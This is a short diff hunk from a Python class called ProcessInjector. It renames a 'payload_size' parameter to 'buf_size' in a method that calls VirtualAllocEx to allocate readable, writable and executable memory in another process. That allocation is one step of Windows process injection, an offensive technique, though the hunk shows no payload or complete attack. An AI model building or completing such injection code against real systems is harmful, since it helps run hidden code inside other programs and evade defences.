@@ -51,11 +51,11 @@ class ProcessInjector:
     def _get_process_id(self, proc: str) -> str:
         return [p for p in pids() if ps(p).name() == proc][0]
     
-    def virtual_alloc_ex(self, payload_size: int):
+    def virtual_alloc_ex(self, buf_size: int):
         self.alloc_mem_base_addr = self.kern32.VirtualAllocEx(
             self.proc_handle,       # Process handle
             0,                      # Let function determine where to allocate the memory
-            payload_size,           # Size of payload
+            buf_size,           # Size of buf
             MEM_COMMIT,             # Commit the region of virtual memory pages we created
             PAGE_EXECUTE_READWRITE) # Set read, write, and execute permissions to allocated memory
         if not self.alloc_mem_base_addr:
